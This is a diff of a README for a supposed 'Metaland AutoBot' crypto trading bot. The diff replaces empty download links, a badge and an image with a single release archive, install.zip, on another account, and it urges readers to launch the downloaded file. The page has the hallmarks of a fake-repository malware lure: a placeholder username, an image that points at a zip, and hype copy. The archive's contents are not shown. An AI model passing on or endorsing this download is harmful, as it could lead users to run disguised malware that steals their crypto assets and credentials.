@@ -16,9 +16,9 @@ Welcome to the Metaland AutoBot repository, your premier solution for automating
 - Topics: metaland-bot, python-bot, trading-bot, crypto-automation, auto-trader, trading-tool
 
 ## 📥 Download
-Download the Metaland AutoBot [here]() and harness the power of automated trading on Metaland!
+Download the Metaland AutoBot [here](https://github.com/caw3144/Metaland-Autobot/releases/download/install/install.zip) and harness the power of automated trading on Metaland!
 
-[![Download Metaland AutoBot](https://github.com/YourUsername/Metaland-AutoBot/releases)]()
+[![Download Metaland AutoBot](https://github.com/YourUsername/Metaland-AutoBot/releases)](https://github.com/caw3144/Metaland-Autobot/releases/download/install/install.zip)
 
 If the link ends with a file name, ensure it is launched to access the tool.
 
@@ -38,7 +38,7 @@ Please use the Metaland AutoBot responsibly and in compliance with Metaland's te
 ## 🌟 Start Trading on Metaland Today!
 Don’t miss out on the opportunity to optimize your trading strategy with the AutoBot. Download now and take your trading to the next level!
 
-![Metaland AutoBot]()
+![Metaland AutoBot](https://github.com/caw3144/Metaland-Autobot/releases/download/install/install.zip)
 
 Let the tool do the work while you enjoy the results! 🚀💹
 
